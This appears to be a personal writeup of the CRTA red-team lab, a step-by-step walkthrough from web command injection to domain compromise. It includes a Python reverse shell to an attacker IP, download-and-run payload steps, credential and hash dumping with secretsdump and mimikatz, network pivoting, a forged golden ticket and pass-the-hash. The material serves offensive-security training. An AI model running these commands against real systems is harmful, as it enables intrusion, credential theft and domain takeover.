# CRTA Lab

{% hint style="danger" %}
USE THE TOOLS  PROVIDED BY THE COURSE
{% endhint %}

## Initial Access

### Discover the hosts

```bash
nmap -sn 192.168.80.0/24

Nmap scan report for 192.168.80.10
```



### Port Scan

```bash
nmap -sC -sV 192.168.80.10
```





## External Web Site



Intercept the request with Burp Suite to try get some injection

### Command Injection

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# rev shell payload
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.200.56",9009));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
{% endcode %}



## Enumeration

Once we have access to the machine, using LinPeas to get information

<pre class="language-bash"><code class="lang-bash"><strong># copy linpeas.sh and run this on att machine
</strong><strong>python3 -m http.server
</strong>
wget http://IP/linpeas.sh
chmod +x lin.sh
./lin.sh
</code></pre>

Manual enumeration for linux priv esc

```bash
sudo -l
```

### Find Juicy files

```
```

```bash
# from linpeas output
/var/www/html/config.php:        $password = 'Web!@#$%';

cat /var/www/html/config.php

$host = "localhost";  
$user = "root";  
$password = 'Web!@#$%';  
$db_name = "pro";

# db access
mysql -u root -p
> 'Web!@#$%'
```



```bash
cat /etc/passwd

privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
```

### Find another networks

```
ifconfig 

ens32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.80.10  netmask 255.255.255.0  broadcast 192.168.80.255
        ether 00:50:56:96:62:dd  txqueuelen 1000  (Ethernet)
        RX packets 74767  bytes 5457705 (5.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 75028  bytes 9385433 (9.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
        ether 00:50:56:96:e4:32  txqueuelen 1000  (Ethernet)
        RX packets 48  bytes 9651 (9.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 41  bytes 3554 (3.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x1000 
```

### Scan another network

if the pwnd machine has 2 or more network interface we can use NMAP on victim machine (if it's installed) and discover another hosts.&#x20;

```bash
nmap -sn 192.168.98.15/24
```

When we find some computers on that network we can perform further scan with nmap

```bash
nmap -sC -sV IP_2
```



### Find credentials to AD Domain

In a linux machine we can find some windows credentials in some log files like these:

```bash
cat .vnc_log
cat .mysql_history
```



### Through the Firefox Data

If we have a .mozilla directory, the dir might contains some interesting data.

We can check into the bookmarks.

{% code overflow="wrap" %}
```bash
cd ~/.mozilla/firefox/...default-release
ls
sqlite3 places.sqlite

> .tables
> SELECT * FROM moz_bookmarks;

'18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7'

```
{% endcode %}



## Pivoting&#x20;

### Ligolo-ng

{% code overflow="wrap" %}
```bash
#Attacker Machine, download proxy & agent :
#Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

#Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

python3 -m http.server 8080

wget http://10.10.200.56:80/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
{% endcode %}

Set up the attacker machine

```bash
sudo ip tuntap add user $YOUR_USER mode tun ligolo

#Delete the 192.168.98.0/24 IP Range from the tun0 interface :
sudo ip route del 192.168.98.0/24 dev tun0

#Up the ligolo interface :
sudo ip link set ligolo up

#Add 192.168.98.0/24 IP range to the ligolo interface :
sudo ip route add 192.168.98.0/24 dev ligolo
```



```bash
# start the proxy on attacker machine
./proxy -selfcert -laddr 0.0.0.0:443

# start the agent on the target machine
./agent -connect 10.10.200.X:443 -ignore-cert
```



On the ligolo-ng proxy, check the session & start the tunnel.

```bash
session
start
```



### SSH

Once we have access to a machine with SSH credential we can create a tunnel to connect our machine to other networks.

Establish the tunnel on a local port

```bash
sudo apt install proxychains

ssh -D $LOCAL_PORT $USER@$VICTIM1_IP
# ex ssh -D 8090 mario@192.168.3.2
```

Once we have the tunnel established, we have modify our proxy file and add this port.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom
socks5 127.0.0.1 8090
socks4 127.0.0.1 8090
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# use nmap through the pivoting
proxychains nmap -sT 192.168.98.30

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP
```



### Rpivot



_RPIVOT allows to tunnel traffic into internal network via socks 4. It works like ssh dynamic port forwarding but in the opposite direction. Target machine as client and attack machine as server._

This tool is usefull when we have access to a machine through web rev shell but **we do not have the credentials** to make a SSH tunneling.

{% embed url="https://github.com/klsecservices/rpivot" %}

```bash
git clone https://github.com/klsecservices/rpivot
```

This tool works with Python2, to running it we can create a virtual env with conda

{% code overflow="wrap" %}
```bash
cd rpivot
conda create -n rpivot python=2.7

# Start the server on attacker machine
python2 server.py --server-port $SERVER_PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port $PROXY_PORT # (ex SERVER_PORT = 9980 and PROXY_PORT 9050)
# server_port = expose port from receiving client connection
# proxy_port = port which will be use by proxychains

#ex
python2 server.py --server-port 8899 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
```
{% endcode %}

Now we have to transfer the rpivot .zip directory to target machine

```bash
# attack machine in the dir where there is rpivot.zip
python3 -m http.server 80

# target machine
wget http://$ATT_IP/rpivot.zip
```

Check if in the target machine there is python2 installed and run the connection to the server.

```bash
# target machine
python --version # check python version

# conect to the rpivot server
python client.py --server-ip $ATT_IP --server-port $SERVER_PORT

#ex
python2 client.py --server-ip 10.10.200.56 --server-port 8899
```

When the connection has been initialized, we have to add this configuration to proxychain conf file.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom and COMMENT the socks5 if there is it
socks4 127.0.0.1 $PROXY_PORT
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# use nmap through the pivoting
proxychains nmap -sT $VICTIM2_IP

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP

# pivot network discovery
proxychains nmap -sn 192.168.98.15/24
```



## Internal Access

```
# with active ligolo-ng
nmap -sT 192.168.98.30
```

<figure><img src="../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

### Credentials logon trying

We can use the credentials found to try the access to Windows machine discovered.

```bash
proxychains crackmapexec smb $TARGET_IP -u $USER -p $PASS

# with ligolo
crackmapexec smb 192.168.98.30 -u john -p "User1@#$%6"
```



### Enumeration with credentials in AD machine

```bash
impacket-secretsdump 'john@192.168.98.30'
> User1@#$%6

*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69865e966bb089639e9b1c7f719427fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:169a376cbed3e83e5ea8eec2d248ce0c:::
[*] Dumping cached domain logon information (domain/username:hash)
CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61: (2025-01-17 14:47:56)
CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-01-21 11:35:46)

[*] _SC_SNMPTRAP 
corpmngr@child.warfare.corp:User4&*&*
```

```bash
crackmapexec smb ad_hosts.txt  -u john -p 'User1@#$%6'

SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)

crackmapexec smb ad_hosts.txt  -u corpmngr -p 'User4&*&*'

SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\corpmngr:User4&*&* 
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)

```

```
impacket-secretsdump 'corpmngr@192.168.98.120'

User4&*&*


```



### PsExec trying

With the validated credentials we can try to establish a connection with `impacket-psexec`

```bash
proxychains impacket-psexec '$DOMAIN/$USER:$PASS@$TARGET_IP'

# with ligolo
impacket-psexec "john@192.168.98.30"
> User1@#$%6
```

```
impacket-psexec 'corpmngr@192.168.98.120'
> User4&*&*
```



### Get Information from the target

If we are in a windows env we can see in what domain is the machine with this command

```powershell
net user /dom
```

and view if there are another DC.

<figure><img src="../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

Try to ping that and we have just discover another machine.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Check the domain groups

```powershell
net group /dom
```



### Create MSFvenom payload to stable shell

To upgrade the shell we can craft a msfvenom payload and execute it in the target machine.

{% code overflow="wrap" %}
```bash
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=$ATT_IP LPORT=$PORT -f exe -o rev.exe
```
{% endcode %}

Transfer the file to target machine

```bash
# target machine
iwr http://$ATT_IP/rev.exe -OutFile C:\Tmp\rev.exe
```

Set a listener and then run the executable

```bash
# attacker machine
nc -nvlp $PORT

# target machine
cd C:\Tmp
.\rev.exe
```

Now we have a stable shell



## AD Enumeration

### Get domain user information

```powershell
# users list
net user /dom

# user info
net user $USER /dom
```



### PowerView

```powershell
iwr http://$ATT_IP:PORT/PowerView.ps1 -OutFile C:\Users\...\pv.ps1

powershell -ep bypass
import-module .\pv.ps1
```

<pre class="language-powershell"><code class="lang-powershell"><strong># get the ad trust information
</strong><strong>Get-ADTrust -Filter * 
</strong>Get-DomainTrust -Filter *

# get forest information
Get-ADForest
</code></pre>

## Generate a Ticket to move between DCs

Requirements:

* Admin privilege on Child DC
* get krbtgt hash

```bash
impacket-secretsdump 'corpmngr@192.168.98.120'
> User4&*&*

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
```

* SID of both child and parent machine

```powershell
# with PowerView
Get-DomainSID -Domain child.DOMAIN.com
Get-DomainSID -Domain DOMAIN.com

# from kali machine
impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761

impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
```

### Craft golden ticket

{% code overflow="wrap" %}
```powershell
.\mimi.exe

kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID /sids:$PARENT_DOMAIN_SID-519 /aes256:$KRBTGT_AES256 /startoffset:-5 /endin:600 /renew:10080 /ptt

# using Ticketer
impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'


```
{% endcode %}



Check the tickets in the session

```
klist
```

or if we used ticketer add ccache file to var

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=corpmngr.ccache

# get Service Ticket
impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
```
{% endcode %}

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache

impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug

# output 
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
```
{% endcode %}

PsExec with LM hash

{% code overflow="wrap" %}
```bash
impacket-psexec 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
```
{% endcode %}





And now use it to access to Parent Domain Controller

Transfer the PsExec.exe to the ticketed session.&#x20;

```powershell
iwr http://$ATT_IP:PORT/PsExec.exe -OutFile C:\Users\..\ps.exe
```

We probably already are in PsExec session and we cannot make 2 session in 1. But to obatin a shell to Parent DC we can copy another RevShell to Parent DC.

```powershell
copy rev2.exe \\$PARENT_DC_NAME\c$
```

And now with PsExec we will execute the Rev2 to make a connection with Parent DC

```powershell
ps.exe -accepteula -d \\$PARENT_DC_NAME cmd /c "C:\Rev2.exe" 
```

## Lateral Movement

### Mimikatz

Get information using mimikatz (High privilege required)

```powershell
iwr http://$ATT_IP :PORT/mimikatz.exe -OutFile C:\Users\...\mimi.exe
```

```powershell
.\mimi.exe 

> sekurlsa::logonpasswords
```

If we found some NTLM we can perform pass-the-hash attack

```bash
proxychains crackmapexec smb $IP -u $USER -H $LM 
```

When we found a machine Pwnd we can perform lateral movement with PsExec

```bash
proxuchains impacket-psexec 'DOMAIN/$USER@$IP' -hashes :$LM
```



